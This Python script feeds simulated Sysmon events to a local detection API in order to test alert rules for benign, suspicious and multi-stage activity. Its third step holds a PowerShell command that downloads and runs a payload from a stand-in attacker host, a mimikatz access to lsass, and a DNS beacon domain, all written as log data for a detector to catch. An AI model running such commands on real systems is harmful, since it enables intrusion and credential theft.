import sys
import json
import urllib.request
import time

BASE_URL = "http://127.0.0.1:8001/api/v1"

def post_json(endpoint, data):
    req = urllib.request.Request(
        f"{BASE_URL}{endpoint}",
        data=json.dumps(data).encode("utf-8"),
        headers={"Content-Type": "application/json"}
    )
    with urllib.request.urlopen(req) as resp:
        return json.loads(resp.read().decode("utf-8"))

def patch_json(endpoint, data):
    req = urllib.request.Request(
        f"{BASE_URL}{endpoint}",
        data=json.dumps(data).encode("utf-8"),
        headers={"Content-Type": "application/json"},
        method="PATCH"
    )
    with urllib.request.urlopen(req) as resp:
        return json.loads(resp.read().decode("utf-8"))

def get_json(endpoint):
    req = urllib.request.Request(f"{BASE_URL}{endpoint}")
    with urllib.request.urlopen(req) as resp:
        return json.loads(resp.read().decode("utf-8"))

def step_reset():
    print("[*] Clearing database...")
    post_json("/dashboard/clear", {})
    print("[+] Database cleared to 0 alerts, 0 campaigns.")

def step1_benign():
    print("\n--- STEP 1: Ingesting Benign Baseline Events ---")
    benign_logs = [
        {
            "source": "Sysmon",
            "event_type": "process_creation",
            "process_name": r"C:\Windows\notepad.exe",
            "command_line": "notepad.exe",
            "user": "alice",
            "device_id": "CORP-LAPTOP-01",
            "source_ip": "192.168.1.50"
        },
        {
            "source": "Sysmon",
            "event_type": "process_creation",
            "process_name": r"C:\Program Files\Google\Chrome\Application\chrome.exe",
            "command_line": "chrome.exe https://intranet.corp.local",
            "user": "alice",
            "device_id": "CORP-LAPTOP-01",
            "source_ip": "192.168.1.50"
        },
        {
            "source": "Sysmon",
            "event_type": "dns_query",
            "domain": "www.google.com",
            "user": "alice",
            "device_id": "CORP-LAPTOP-01",
            "source_ip": "192.168.1.50"
        },
        {
            "source": "Sysmon",
            "event_type": "file_create",
            "file_path": r"C:\Users\alice\Documents\quarterly_report.docx",
            "user": "alice",
            "device_id": "CORP-LAPTOP-01",
            "source_ip": "192.168.1.50"
        }
    ]
    for b in benign_logs:
        res = post_json("/events/ingest", b)
        print(f"  [+] Ingested {b['event_type']} -> ID: {res.get('event_id')}, Status: {res.get('security_status')}, Rule: '{res.get('detection_rule')}'")
    time.sleep(1)

def step2_single_suspicious():
    print("\n--- STEP 2: Ingesting Single Suspicious Event ---")
    suspicious_log = {
        "source": "Sysmon",
        "event_type": "process_creation",
        "process_name": r"C:\Windows\System32\whoami.exe",
        "command_line": "whoami /all",
        "user": "alice",
        "device_id": "CORP-LAPTOP-01",
        "source_ip": "192.168.1.50"
    }
    res = post_json("/events/ingest", suspicious_log)
    print(f"  [+] Ingested single discovery event -> ID: {res.get('event_id')}, Status: {res.get('security_status')}, Rule: '{res.get('detection_rule')}', Reason: '{res.get('detection_reason')}'")
    time.sleep(1)

def step3_multistage():
    print("\n--- STEP 3: Ingesting Multi-Stage Attack Sequence ---")
    stage3_events = [
        {
            "source": "Sysmon",
            "event_type": "process_creation",
            "process_name": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            "command_line": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command IEX (New-Object Net.WebClient).DownloadString('http://attacker.local/payload.ps1')",
            "user": "alice",
            "device_id": "CORP-LAPTOP-01",
            "source_ip": "192.168.1.50"
        },
        {
            "source": "Sysmon",
            "event_type": "process_access",
            "process_name": r"C:\Temp\mimikatz.exe",
            "parent_process": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            "target_image": r"C:\Windows\System32\lsass.exe",
            "user": "alice",
            "device_id": "CORP-LAPTOP-01",
            "source_ip": "192.168.1.50"
        },
        {
            "source": "Sysmon",
            "event_type": "dns_query",
            "domain": "beacon.duckdns.org",
            "user": "alice",
            "device_id": "CORP-LAPTOP-01",
            "source_ip": "192.168.1.50"
        }
    ]
    for ev in stage3_events:
        res = post_json("/events/ingest", ev)
        print(f"  [+] Ingested attack stage ({ev['event_type']}) -> ID: {res.get('event_id')}, Status: {res.get('security_status')}, Rule: '{res.get('detection_rule')}', MITRE: {res.get('mitre_stage')}")
        time.sleep(0.5)
    time.sleep(1)

if __name__ == "__main__":
    if len(sys.argv) > 1:
        arg = sys.argv[1]
        if arg == "reset":
            step_reset()
        elif arg == "1":
            step1_benign()
        elif arg == "2":
            step2_single_suspicious()
        elif arg == "3":
            step3_multistage()
        elif arg == "all":
            step_reset()
            step1_benign()
            step2_single_suspicious()
            step3_multistage()
    else:
        print("Usage: python run_stage_by_stage.py [reset|1|2|3|all]")
